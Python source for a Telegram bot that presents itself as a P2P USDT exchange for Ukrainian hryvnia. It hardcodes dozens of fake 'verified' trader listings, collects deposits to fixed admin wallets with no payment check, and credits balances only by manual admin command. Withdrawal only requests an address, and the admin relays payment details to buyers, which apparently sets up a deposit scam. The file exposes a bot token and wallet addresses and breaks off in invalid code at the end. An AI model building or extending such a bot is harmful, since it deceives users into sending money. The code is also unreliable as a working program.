import logging
import asyncio
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext


API_TOKEN = "7079057857:AAEtlYk_l1eTczU8_a9LU4tVD1lVmpwdAOE"
ADMIN_IDS = {5138418509}
MIN_TOPUP = 10


bot = Bot(token=API_TOKEN, parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

user_balances = {}
banned_users = set()
user_ads = {"buy": [], "sell": []}
def banks(*names):
    return list(names)

def ad(u, r, lim, b, cur="USDT (TRC20)", t="sell", terms="Без дополнительных условий"):
    return {
        "username": u,
        "verified": True,
        "rate": r,
        "limit": lim,
        "banks": b,
        "currency": cur,
        "type": t,
        "terms": terms
    }

user_ads["sell"] = [
    ad("@CryptoBoss",   42.91, "500 – 2000 грн", banks("Monobank", "PrivatBank", "PUMB", "A-Bank", "Sense Bank"), t="sell"),
    ad("@UkrTrader",    42.95, "500 – 2000 грн", banks("Monobank", "Sense Bank", "Ukrsibbank", "Concord Bank"), t="sell"),
    ad("@BestRate24",   42.92, "500 – 2000 грн", banks("PrivatBank", "PUMB", "OTP Bank", "Oschadbank", "Raiffeisen"), t="sell"),
    ad("@FastUSDT",     42.93, "500 – 2000 грн", banks("Monobank", "PUMB", "MTB Bank", "Globus Bank"), t="sell"),
    ad("@TrustExchanger",42.96, "500 – 2000 грн", banks("Raiffeisen", "Sense Bank", "PrivatBank", "Ukrsibbank", "Oschadbank"), t="sell"),
    ad("@VerifedPro",   42.90, "500 – 2000 грн", banks("Monobank", "PrivatBank", "A-Bank", "Credit Agricole"), t="sell"),
    ad("@TetherKing",   42.97, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen", "Sense Bank", "OTP Bank"), t="sell"),
    ad("@CashToCoin",   43.01, "2000 – 6000 грн", banks("PrivatBank", "PUMB", "Ukrsibbank", "Concord Bank", "Oschadbank"), t="sell"),
    ad("@EasyChange",   42.98, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "PUMB", "MTB Bank"), t="sell"),
    ad("@USDTbanker",   43.05, "2000 – 6000 грн", banks("Raiffeisen", "PrivatBank", "Sense Bank", "Monobank", "Globus Bank", "Tascombank"), t="sell"),
    ad("@ExchangePlus", 43.02, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "PUMB", "Oschadbank", "Ukrsibbank"), t="sell"),
    ad("@BitProfi",     42.94, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "PUMB", "Oschadbank", "OTP Bank", "Credit Agricole"), t="sell"),
    ad("@FiatBridge",   43.00, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "Sense Bank", "Ukrsibbank"), t="sell"),
    ad("@DigitalGate",  43.03, "2000 – 6000 грн", banks("PrivatBank", "PUMB", "Raiffeisen", "Sense Bank", "Oschadbank"), t="sell"),
    ad("@FastMoney",    43.21, "6000 – 40000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen", "Sense Bank", "Ukrsibbank", "Concord Bank"), t="sell"),
    ad("@TokenExpress", 43.38, "6000 – 40000 грн", banks("PrivatBank", "PUMB", "Oschadbank", "Ukrsibbank", "Concord Bank", "Globus Bank"), t="sell"),
    ad("@FixRate",      43.45, "6000 – 40000 грн", banks("Monobank", "PrivatBank", "PUMB", "A-Bank", "Sense Bank", "OTP Bank"), t="sell"),
    ad("@UkrUSDT",      43.32, "6000 – 40000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen", "Oschadbank"), t="sell"),
    ad("@MonoCrypto",   43.29, "6000 – 40000 грн", banks("PrivatBank", "PUMB", "Oschadbank", "Tascombank", "Credit Agricole", "MTB Bank"), t="sell"),
    ad("@VerifiedX",    43.50, "6000 – 40000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen", "Sense Bank", "Ukrsibbank", "Concord Bank", "Globus Bank"), t="sell"),
    ad("@RateMaster",   43.40, "6000 – 40000 грн", banks("PrivatBank", "PUMB", "Oschadbank", "Ukrsibbank", "OTP Bank", "Credit Agricole"), t="sell"),
]

user_ads["buy"] = [
    ad("@CryptoBoss",   43.1, "500 – 2000 грн", banks("Monobank", "PrivatBank", "PUMB", "A-Bank", "Sense Bank"), t="buy"),
    ad("@UkrTrader",    43.6, "500 – 2000 грн", banks("Monobank", "Sense Bank", "Ukrsibbank", "Concord Bank"), t="buy"),
    ad("@BestRate24",   41.78, "500 – 2000 грн", banks("PrivatBank", "PUMB", "OTP Bank", "Oschadbank", "Raiffeisen"), t="buy"),
    ad("@FastUSDT",     43.48, "500 – 2000 грн", banks("Monobank", "PUMB", "MTB Bank", "Globus Bank"), t="buy"),
    ad("@TrustExchanger",43.29, "500 – 2000 грн", banks("Raiffeisen", "Sense Bank", "PrivatBank", "Ukrsibbank", "Oschadbank"), t="buy"),
    ad("@VerifedPro",   43.76, "500 – 2000 грн", banks("Monobank", "PrivatBank", "A-Bank", "Credit Agricole"), t="buy"),
    ad("@TetherKing",   43.68, "500 – 2000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen"), t="buy"),
    ad("@CashToCoin",   43.92, "500 – 2000 грн", banks("PrivatBank", "PUMB", "Ukrsibbank", "Concord Bank"), t="buy"),
    ad("@EasyChange",   43.63, "500 – 2000 грн", banks("Monobank", "PrivatBank", "PUMB", "MTB Bank"), t="buy"),
    ad("@USDTbanker",   43.45, "2000 – 6000 грн", banks("Raiffeisen", "PrivatBank", "Sense Bank", "Monobank", "Globus Bank", "Tascombank"), t="buy"),
    ad("@ExchangePlus", 43.15, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "PUMB", "Oschadbank", "Ukrsibbank"), t="buy"),
    ad("@BitProfi",     43.38, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "PUMB", "Oschadbank", "OTP Bank", "Credit Agricole"), t="buy"),
    ad("@FiatBridge",   43.40, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "Sense Bank", "Ukrsibbank"), t="buy"),
    ad("@DigitalGate",  41.89, "2000 – 6000 грн", banks("PrivatBank", "PUMB", "Raiffeisen", "Sense Bank", "Oschadbank"), t="buy"),
    ad("@FastMoney",    43.29, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen", "Sense Bank"), t="buy"),
    ad("@TokenExpress", 42.26, "2000 – 6000 грн", banks("PrivatBank", "PUMB", "Oschadbank", "Ukrsibbank", "Concord Bank", "Globus Bank"), t="buy"),
    ad("@FixRate",      42.33, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "PUMB", "A-Bank", "Sense Bank", "OTP Bank"), t="buy"),
    ad("@UkrUSDT",      43.27, "2000 – 6000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen", "Oschadbank"), t="buy"),
    ad("@MonoCrypto",   43.61, "6000 – 40000 грн", banks("PrivatBank", "PUMB", "Oschadbank", "Tascombank", "Credit Agricole", "MTB Bank"), t="buy"),
    ad("@VerifiedX",    43.68, "6000 – 40000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen", "Sense Bank", "Ukrsibbank", "Concord Bank", "Globus Bank"), t="buy"),
    ad("@RateMaster",   42.70, "6000 – 40000 грн", banks("PrivatBank", "PUMB", "Oschadbank", "Ukrsibbank", "OTP Bank", "Credit Agricole"), t="buy"),
    ad("@FixSpread",    43.62, "6000 – 40000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen", "Sense Bank"), t="buy"),
    ad("@UAChanger",    42.66, "6000 – 40000 грн", banks("Monobank", "PrivatBank", "PUMB", "Ukrsibbank", "Concord Bank"), t="buy"),
    ad("@DeepRate",     43.69, "6000 – 40000 грн", banks("PrivatBank", "PUMB", "Oschadbank", "Ukrsibbank", "Concord Bank", "Globus Bank"), t="buy"),
    ad("@NightTrader",  43.64, "6000 – 40000 грн", banks("Monobank", "PrivatBank", "PUMB", "Raiffeisen", "Oschadbank"), t="buy"),
]


chat_links = {}
await_screenshot = set()
active_orders = {}


wallets = {
    "USDT (TRC20)": "TQz9gQCkYpARgjhZ3LkgvjBPXP3CbHLs4j",
    "USDT (TON)":
"UQDrzrCu7PcyQYxkREgk6sUfkVk2kvox8PwE63ZE6EupBljy",
    "BTC": "13tERrpTrtWP42ehZKBZ4qcN9ESE4UCXUS",
    "ETH (ERC20)": "0xef2adf5e2e761a3b64846ac46ae1f10e400dc652",
    "BNB (BEP20)": "0xef2adf5e2e761a3b64846ac46ae1f10e400dc652",
    "TRX": "TQz9gQCkYpARgjhZ3LkgvjBPXP3CbHLs4j"
}

ADMIN_IDS = {5138418509}  # ← заміни на свій Telegram ID

def get_main_kb(user_id=None):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("🟢 Покупка USDT"), KeyboardButton("🔴 Продажа USDT"))
    kb.add(KeyboardButton("📥 Пополнить баланс"), KeyboardButton("👛 Кошелёк"))
    kb.add(KeyboardButton("📋 Объявления"), KeyboardButton("➕ Добавить объявление"))
    kb.add(KeyboardButton("🔻 Вывести USDT"), KeyboardButton("🗂 Мои ордера"))

    if user_id in ADMIN_IDS:
        kb.add(KeyboardButton("🗨️ Чаты"))

    return kb




def get_range_kb(prefix):
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton("500–2000 ₴", callback_data=f"{prefix}:500-2000"),
        InlineKeyboardButton("2000–6000 ₴", callback_data=f"{prefix}:2000-6000"),
        InlineKeyboardButton("6000–40000 ₴", callback_data=f"{prefix}:6000-40000")
    )
    return kb

def parse_limit(limit_str):
    # Прибираємо валюту, пробіли, тире
    clean = limit_str.replace("₴", "").replace("грн", "").replace(" ", "").replace(",", "")
    # Уніфікуємо тире
    clean = clean.replace("–", "-")

    if "-" not in clean:
        raise ValueError("Неверный формат диапазона")

    a, b = clean.split("-")
    return int(a), int(b)



def fmt_ad(ad, idx):
    return (
        f"<b>#{idx+1} | {ad['type'].upper()}</b>\n"
        f"✅ Верифицировано • <code>{ad['username']}</code>\n"
        f"Курс: <b>{ad['rate']}</b> ₴\n"
        f"Объём: <b>{ad['limit']}</b>\n"
        f"Банки: <i>{', '.join(ad['banks'])}</i>\n"
        f"Время оплаты: 15 мин\n"
        f"Условия: {ad.get('terms', '—')}"
    )
def get_admin_delete_kb(idx, ad_type):
    return InlineKeyboardMarkup().add(
        InlineKeyboardButton("🗑 Удалить (админом)", callback_data=f"admin_del:{ad_type}:{idx}")
    )

def ensure_balance(user_id):
    if user_id not in user_balances:
        user_balances[user_id] = {k: 0 for k in wallets}

def get_wallets_text():
    return "\n".join([f"<b>{k}</b>: <code>{v}</code>" for k, v in wallets.items()])

class AdForm(StatesGroup):
    type = State()
    amount = State()
    rate = State()
    banks = State()

class OrderForm(StatesGroup):
    amount_rub = State()

def is_banned(user_id):
    return user_id in banned_users

from functools import wraps

def ban_check(func):
    @wraps(func)
    async def wrapper(message_or_call, *args, **kwargs):
        user_id = message_or_call.from_user.id
        if is_banned(user_id):
            await message_or_call.answer("🚫 Вы были заблокированы и не можете пользоваться ботом.")
            return
        return await func(message_or_call, *args, **kwargs)
    return wrapper

@dp.message_handler(commands=["start"])
@ban_check
async def start(message: types.Message):
    ensure_balance(message.from_user.id)
    await message.answer("👋 Добро пожаловать!", reply_markup=get_main_kb(message.from_user.id))


@dp.message_handler(commands=["addusdt"])
async def add_usdt_handler(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("⛔ Команда доступна только администраторам.")

    try:
        text = message.text.replace("\n", " ").strip()
        parts = text.split()

        if len(parts) != 3:
            return await message.answer(
                "❗ Неверный формат команды.\n\n"
                "Пример:\n<code>/addusdt 123456789 10</code>"
            )

        user_id = int(parts[1])
        amount = float(parts[2])

        # Инициализация баланса
        if user_id not in user_balances:
            user_balances[user_id] = {}
        if "USDT (TRC20)" not in user_balances[user_id]:
            user_balances[user_id]["USDT (TRC20)"] = 0.0

        user_balances[user_id]["USDT (TRC20)"] += amount

        await message.answer(
            f"✅ Пользователю <code>{user_id}</code> зачислено {amount} USDT (TRC20)."
        )

        try:
            await bot.send_message(
                user_id,
                f"💰 Вам зачислено <b>{amount} USDT (TRC20)</b> на баланс."
            )
        except:
            await message.answer("⚠️ Не удалось отправить сообщение пользователю.")

    except Exception as e:
        await message.answer(f"❗ Ошибка: {e}")

@dp.message_handler(lambda m: m.text == "📥 Пополнить баланс")
@ban_check
async def handle_top_up(message: types.Message):
    await message.answer(
        f"💳 Отправьте USDT на адрес ниже:\n\n{get_wallets_text()}\n\n"
        f"⚠️ Мин. сумма пополнения — <b>{MIN_TOPUP}$</b>.\n"
        f"После оплаты нажмите кнопку ниже.",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("✅ Я оплатил", callback_data="topup_done")
        )
    )

@dp.callback_query_handler(lambda c: c.data == "topup_done")
async def confirm_topup(call: types.CallbackQuery):
    await call.message.answer("⌛ Спасибо! Средства будут зачислены в течение 10 минут.")

@dp.callback_query_handler(lambda c: c.data.startswith("admin_del:"))
async def admin_delete_ad(call: types.CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return await call.answer("⛔ Недостаточно прав.")

    _, ad_type, idx = call.data.split(":")
    idx = int(idx)

    if 0 <= idx < len(user_ads[ad_type]):
        removed = user_ads[ad_type].pop(idx)

        # також видалити з user_orders якщо є
        for uid, ads in user_balances.get("user_orders", {}).items():
            if removed in ads:
                ads.remove(removed)

        await call.message.edit_text("🗑 Объявление удалено администратором.")
    else:
        await call.answer("⚠️ Ошибка удаления.")

@dp.callback_query_handler(lambda c: c.data.startswith("delad:"))
@ban_check
async def delete_user_ad(call: types.CallbackQuery):
    idx = int(call.data.split(":")[1])
    user_id = call.from_user.id
    orders = user_balances.get("user_orders", {}).get(user_id, [])

    if 0 <= idx < len(orders):
        ad = orders.pop(idx)
        user_ads[ad["type"]].remove(ad)
        await call.message.edit_text("✅ Объявление удалено.")
    else:
        await call.message.answer("⚠️ Ошибка при удалении.")

@dp.message_handler(lambda m: m.text == "👛 Кошелёк")
@ban_check
async def wallet_view(message: types.Message):
    ensure_balance(message.from_user.id)
    bal = user_balances[message.from_user.id]
    txt = "👛 Ваш баланс:\n"
    for k, v in bal.items():
        txt += f"• {k}: <b>{v:.2f}</b>\n"
    await message.answer(txt)

@dp.message_handler(lambda m: m.text == "🔻 Вывести USDT")
async def handle_withdraw(message: types.Message):
    ensure_balance(message.from_user.id)
    usdt_balance = user_balances[message.from_user.id]["USDT (TRC20)"]

    if usdt_balance < 1:
        await message.answer("❌ Недостаточно средств для вывода. Минимум 10 USDT.")
        return

    await message.answer(
        f"💸 Вы можете вывести USDT (TRC20).\n\n"
        f"Пожалуйста, отправьте адрес TRC20-кошелька, куда перевести <b>{usdt_balance:.2f} USDT</b>.\n\n"
        f"Или напишите админу с ID: <code>{message.from_user.id}</code>."
    )

@dp.message_handler(lambda m: m.text == "📋 Объявления")
@ban_check
async def show_ad_options(message: types.Message):
    await message.answer(
        f"📊 Объявлений:\n🔴 Продажа: {len(user_ads['sell'])}\n🟢 Покупка: {len(user_ads['buy'])}"
    )

@dp.message_handler(lambda m: m.text == "🗂 Мои ордера")
@ban_check
async def show_my_orders(message: types.Message):
    user_id = message.from_user.id
    orders = user_balances.get("user_orders", {}).get(user_id, [])

    if not orders:
        return await message.answer("❌ У вас нет активных ордеров.")

    for idx, ad in enumerate(orders):
        text = (
            f"<b>#{idx + 1}</b> | Тип: <b>{ad['type']}</b>\n"
            f"Курс: {ad['rate']}₽\n"
            f"Объём: {ad['limit']}\n"
            f"Банки: {', '.join(ad['banks'])}\n"
            f"Условия: {ad.get('terms', '—')}"
        )
        kb = InlineKeyboardMarkup().add(
            InlineKeyboardButton("❌ Удалить", callback_data=f"delad:{idx}")
        )
        await message.answer(text, reply_markup=kb)


@dp.message_handler(lambda m: m.text == "🟢 Покупка USDT")
@ban_check
async def handle_buy(message: types.Message):
    await message.answer("💰 Выберите диапазон:", reply_markup=get_range_kb("buy"))

@dp.message_handler(lambda m: m.text == "🔴 Продажа USDT")
@ban_check
async def handle_sell(message: types.Message):
    ensure_balance(message.from_user.id)
    if user_balances[message.from_user.id]["USDT (TRC20)"] < 10:
        return await message.answer("❌ Недостаточно средств на балансе.")
    await message.answer("💸 Выберите диапазон:", reply_markup=get_range_kb("sell"))

@dp.message_handler(lambda m: m.text == "🗨️ Чаты")
async def admin_chat_list(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ У вас нет доступа к этой функции.")

    if not chat_links:
        return await message.answer("📭 Нет активных чатов.")

    for user_id, data in chat_links.items():
        ad = data.get("ad", {})
        buyer_id = data.get("buyer_id", user_id)
        seller_username = ad.get("username", "—")
        ad_type = ad.get("type", "—")

        text = (
            f"🔄 Чат:\n"
            f"👤 Покупатель: <code>{buyer_id}</code>\n"
            f"👤 Продавец: <code>{seller_username}</code>\n"
            f"📦 Ордер: <b>{ad_type.upper()}</b>\n"
        )
        kb = InlineKeyboardMarkup().add(
            InlineKeyboardButton("💬 Открыть чат", callback_data=f"adminchat:{buyer_id}")
        )
        await message.answer(text, reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data.startswith("buy:") or c.data.startswith("sell:"))
@ban_check
async def show_filtered_ads(call: types.CallbackQuery):
    prefix, rng = call.data.split(":")
    min_sum, max_sum = map(int, rng.split("-"))
    ads = user_ads[prefix]

    def limit_in_range(ad_limit, selected_min, selected_max):
        try:
            ad_min, ad_max = parse_limit(ad_limit)
            return selected_min <= ad_min and ad_max <= selected_max
        except:
            return False

    filtered = [ad for ad in ads if limit_in_range(ad["limit"], min_sum, max_sum)]

    if not filtered:
        return await call.message.answer("🔍 Объявлений не найдено.")

    msg_ids = []
    for i, ad in enumerate(filtered):
        kb = InlineKeyboardMarkup().add(
            InlineKeyboardButton("📩 Открыть ордер", callback_data=f"open:{prefix}:{i}")
        )
        if call.from_user.id in ADMIN_IDS:
            kb.add(InlineKeyboardButton("🗑 Удалить (админом)", callback_data=f"admin_del:{prefix}:{i}"))

        msg = await call.message.answer(fmt_ad(ad, i), reply_markup=kb)
        msg_ids.append(msg.message_id)

    chat_links[call.from_user.id] = {
        "msgs": msg_ids,
        "admins": ADMIN_IDS.copy()
    }
from aiogram.dispatcher.filters.state import State, StatesGroup

@dp.callback_query_handler(lambda c: c.data.startswith("open:"), state="*")
@ban_check
async def open_order(call: types.CallbackQuery, state: FSMContext):
    _, otype, idx = call.data.split(":")
    idx = int(idx)

    ad = user_ads[otype][idx]
    buyer_id = call.from_user.id
    seller_username = ad["username"]

    # Ініціалізуємо чат покупця
    if buyer_id not in chat_links:
        chat_links[buyer_id] = {}
    chat_links[buyer_id]["with"] = seller_username
    chat_links[buyer_id]["ad"] = ad

    # Якщо продавець зареєстрований як User_123456
    if seller_username.startswith("User_"):
        seller_id = int(seller_username.replace("User_", ""))
        active_orders[buyer_id] = seller_id
        active_orders[seller_id] = buyer_id

        # Ініціалізуємо чат продавця
        chat_links[seller_id] = {
            "with": buyer_id,
            "ad": ad
        }

        await state.update_data(
            order_type=otype,
            order_idx=idx,
            target_user=seller_id,
            ad_data=ad
        )

        amount_text = f"Сума, яку хоче обміняти покупець: {ad['limit']} ₴"
        await bot.send_message(seller_id, f"📩 Ваше оголошення відкрито!\n{amount_text}")

    else:
        await state.update_data(
            order_type=otype,
            order_idx=idx,
            ad_data=ad
        )

    # Питаємо покупця суму
    await OrderForm.amount_rub.set()
    await call.message.answer("💰 Введите сумму в UAH, которую хотите обменять:")


    # Видаляємо попередні повідомлення з оголошеннями
    if buyer_id in chat_links:
        for msg_id in chat_links[buyer_id].get("msgs", []):
            if msg_id != call.message.message_id:
                try:
                    await bot.delete_message(call.message.chat.id, msg_id)
                except:
                    pass

    chat_links[buyer_id] = {"admins": ADMIN_IDS.copy()}

    # повідомити адміна
    for admin_id in ADMIN_IDS:
        await bot.send_message(
            admin_id,
            f"📥 Новый ордер ({otype.upper()})\n"
            f"Пользователь: <code>{buyer_id}</code>\n"
            f"Ожидается сообщение для передачи реквизитов."
        )

    await call.message.answer(
    "💬 Ордер открыт. Вы можете переписываться здесь.\n\n"
    "Когда закончите — нажмите кнопку ниже.",
    reply_markup=InlineKeyboardMarkup().add(
        InlineKeyboardButton("❌ Завершить диалог", callback_data="end_chat")
    )
)


    await asyncio.sleep(180)
    await bot.send_message(
        buyer_id,
        "Если вы произвели оплату, нажмите ниже:",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("✅ Я оплатил", callback_data=f"confirm:{otype}:{idx}")
        )
    )

@dp.callback_query_handler(lambda c: c.data.startswith("confirm:"))
async def confirm_payment(call: types.CallbackQuery):
    await_screenshot.add(call.from_user.id)
    await call.message.answer("📸 Отправьте, пожалуйста, скриншот оплаты.")

@dp.message_handler(content_types=types.ContentType.PHOTO)
async def handle_photo(message: types.Message):
    if message.from_user.id in await_screenshot:
        await_screenshot.remove(message.from_user.id)
        for admin_id in ADMIN_IDS:
            await bot.send_photo(admin_id, message.photo[-1].file_id,
                                 caption=f"📤 Скрин от <code>{message.from_user.id}</code>")
        await message.answer("✅ Скрин получен. USDT будут начислены в течение 10 минут.")

@dp.callback_query_handler(lambda c: c.data == "close_order")
@ban_check
async def close_order(call: types.CallbackQuery):
    try:
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await call.message.answer("✅ Ордер закрыт.", reply_markup=get_main_kb(call.from_user.id))  # ✅
    except:
        await call.message.answer("⚠️ Не удалось закрыть ордер.")

    # 💬 Очистка активного чату
    user_id = call.from_user.id
    pair_id = active_orders.pop(user_id, None)
    if pair_id:
        active_orders.pop(pair_id, None)

@dp.message_handler(lambda m: m.text == "➕ Добавить объявление")
@ban_check
async def add_ad_start(message: types.Message):
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton("🔴 Продажа", callback_data="adtype:sell"),
        InlineKeyboardButton("🟢 Покупка", callback_data="adtype:buy")
    )
    await message.answer("🔄 Вы хотите купить или продать USDT?", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data.startswith("adtype:"))
async def ad_choose_type(call: types.CallbackQuery, state: FSMContext):
    _, adtype = call.data.split(":")
    user_id = call.from_user.id
    ensure_balance(user_id)

    # 🛑 Якщо це продаж — перевіряємо баланс
    if adtype == "sell" and user_balances[user_id]["USDT (TRC20)"] < 10:
        return await call.message.answer("❌ Недостаточно средств для создания объявления о продаже. Минимум: 10 USDT.")

    await state.update_data(adtype=adtype)
    await AdForm.amount.set()
    await call.message.answer("💵 Введите диапазон суммы (например: 500–2000 ₴):")

@dp.callback_query_handler(lambda c: c.data == "delmsg")
async def handle_delete_message(call: types.CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return await call.answer("⛔ У вас нет прав.", show_alert=True)
    try:
        await bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception as e:
        await call.answer(f"⚠️ Ошибка удаления.")

@dp.callback_query_handler(lambda c: c.data.startswith("adminchat:"))
async def open_admin_chat(call: types.CallbackQuery):
    buyer_id = int(call.data.split(":")[1])
    if buyer_id not in chat_links:
        return await call.message.answer("❌ Чат не найден.")

    chat_links[call.from_user.id] = {"with": buyer_id, "is_admin": True}
    await call.message.answer("💬 Вы подключены к чату. Напишите сообщение.")

@dp.message_handler(state=AdForm.amount)
@ban_check
async def ad_set_amount(message: types.Message, state: FSMContext):
    text = message.text.strip()

    # Якщо немає значка "₴", додаємо автоматично
    if "₽" not in text:
        text += " ₽"

    await state.update_data(amount=text)
    await AdForm.rate.set()
    await message.answer("💰 Введите курс в ₴ (например: 43.12):")


@dp.message_handler(state=AdForm.rate)
@ban_check
async def ad_set_rate(message: types.Message, state: FSMContext):
    await state.update_data(rate=message.text)
    await AdForm.banks.set()
    await message.answer("🏦 Укажите банки через запятую (например: MonoBank,PrivatBank,ПУМБ):")

@dp.message_handler(state=AdForm.banks)
@ban_check
async def ad_finish(message: types.Message, state: FSMContext):
    await state.update_data(banks=[b.strip() for b in message.text.split(",")])
    data = await state.get_data()

    ad = {
        "username": f"User_{message.from_user.id}",
        "rate": float(data["rate"]),
        "limit": data["amount"],
        "banks": data["banks"],
        "terms": "Без дополнительных условий",
        "type": data["adtype"]  # має бути 'buy' або 'sell'
    }

    print("=== AD TYPE ===", data["adtype"])
    print("=== AD OBJECT ===", ad)

    # ✅ Додаємо в глобальний список
    user_ads[data["adtype"]].append(ad)

    # ✅ Додаємо в особисті оголошення користувача
    if "user_orders" not in user_balances:
        user_balances["user_orders"] = {}

    if message.from_user.id not in user_balances["user_orders"]:
        user_balances["user_orders"][message.from_user.id] = []

    user_balances["user_orders"][message.from_user.id].append(ad)

    await message.answer("✅ Объявление добавлено.", reply_markup=get_main_kb(message.from_user.id))
    await state.finish()


@dp.message_handler(state=OrderForm.amount_rub)
async def order_enter_amount(message: types.Message, state: FSMContext):
    amount_rub = message.text.strip()
    if not amount_rub.replace(".", "").isdigit():
        return await message.answer("⚠️ Введите число в ₴ (например: 1500).")

    data = await state.get_data()
    buyer_id = message.from_user.id
    ad = data["ad_data"]
    seller_id = ad.get("user_id")  # Цільовий користувач
    order_type = data["order_type"]
    order_idx = data["order_idx"]

    # Зберігаємо ID продавця
    chat_links[buyer_id] = {
        "target": seller_id,
        "admins": ADMIN_IDS.copy()
    }

    # Зберігаємо ID покупця для продавця
    if seller_id:
        chat_links[seller_id] = {
            "target": buyer_id,
            "admins": ADMIN_IDS.copy()
        }

       # Списуємо 10 USDT у продавця (тільки якщо він існує в user_balances)
    if seller_id and seller_id in user_balances:
        user_balances[seller_id]["USDT (TRC20)"] -= 10

    # Повідомляємо покупця
    await message.answer(
        f"📩 Ордер открыт!\nСумма: <b>{amount_rub} ₴</b>\nОжидайте реквизиты.",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("❌ Закрыть ордер", callback_data="close_order")
        )
    )

    # Повідомляємо продавця
    if seller_id:
        await bot.send_message(
            seller_id,
            f"📥 Ваш ордер открыли на сумму <b>{amount_rub} ₴</b>!\n"
            f"Вы можете переписываться с покупателем прямо здесь."
        )
    # Через 3 минуты кнопка "Я оплатил"
    await asyncio.sleep(180)
    await bot.send_message(
        buyer_id,
        "Если вы произвели оплату, нажмите кнопку ниже:",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("✅ Я оплатил", callback_data=f"confirm:{order_type}:{order_idx}")
        )
    )

    # Додати в глобальний список оголошень
    user_ads[data["adtype"]].append(ad)
    print("🔍 Додано оголошення:", ad)

    # Додати в персональні оголошення користувача
    if "user_orders" not in user_balances:
        user_balances["user_orders"] = {}

    if message.from_user.id not in user_balances["user_orders"]:
        user_balances["user_orders"][message.from_user.id] = []

    user_balances["user_orders"][message.from_user.id].append(ad)

    await message.answer("✅ Объявление добавлено.", reply_markup=get_main_kb(message.from_user.id))  # ✅
    await state.finish()

# === Прокладка: адмін бачить повідомлення користувача
@dp.message_handler(lambda m: m.from_user.id in ADMIN_IDS)
async def admin_to_user(message: types.Message):
    text = message.text.strip()
    try:
        uid_str, msg = text.split(" ", 1)
        uid = int(uid_str)
        reply_markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton("🗑 Удалить", callback_data="delmsg")
        )
        await bot.send_message(uid, msg, reply_markup=reply_markup)
        await message.answer("✅ Сообщение отправлено.")
    except Exception as e:
        await message.answer("❗ Напишите ID пользователя, а затем через пробел сообщение. Пример:\n<code>5138418509 Привет</code>")

    try:
        uid_str, msg = text.split(" ", 1)
        uid = int(uid_str)
        await bot.send_message(uid, msg)
        await message.answer("✅ Сообщение отправлено.")
    except Exception as e:
        await message.answer(f"⚠️ Ошибка: {e}")



# === Прокладка: адмін відповідає користувачу
@dp.message_handler(lambda m: m.from_user.id in ADMIN_IDS and m.reply_to_message and m.reply_to_message.text)
async def admin_reply_handler(message: types.Message):
    lines = message.reply_to_message.text.split("\n")
    for line in lines:
        if "от" in line and "Сообщение" in line:
            uid = int(line.split("от")[1].split(":")[0].strip())
            reply_markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("🗑 Удалить", callback_data="delmsg")
            )
            await bot.send_message(uid, message.text, reply_markup=reply_markup)
            break

@dp.message_handler(lambda m: m.from_user.id in active_orders)
async def relay_message_between_users(message: types.Message):
    sender_id = message.from_user.id
    recipient_id = active_orders.get(sender_id)
    if not recipient_id:
        return

    sender_name = f"@{message.from_user.username}" if message.from_user.username else f"User {sender_id}"

# --- 1. Глобальний список для відслідковування вже повідомлених ID ---
sent_chat_ids = set()

# --- 2. Обробка повідомлень ---
@dp.message_handler()
async def handle_message(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username or "—"

    if user_id not in sent_chat_ids:
        sent_chat_ids.add(user_id)
        for admin_id in ADMIN_IDS:
            await bot.send_message(
                admin_id,
                f"📩 Новий користувач!\n"
                f"👤 ID: <code>{user_id}</code>\n"
                f"🔗 Username: @{username}"
            )

    # Тут можеш залишити або обробляти інші повідомлення
    # await message.answer("✅ Повідомлення отримано.")

# --- 3. Обробка будь-якої кнопки ---
@dp.callback_query_handler(lambda call: True)
async def handle_callback(call: types.CallbackQuery):
    user_id = call.from_user.id
    username = call.from_user.username or "—"

    if user_id not in sent_chat_ids:
        sent_chat_ids.add(user_id)
        for admin_id in ADMIN_IDS:
            await bot.send_message(
                admin_id,
                f"📩 Новий користувач (callback)!\n"
                f"👤 ID: <code>{user_id}</code>\n"
                f"🔗 Username: @{username}"
            )

    await call.answer()


    # === Текст ===
    if message.text:
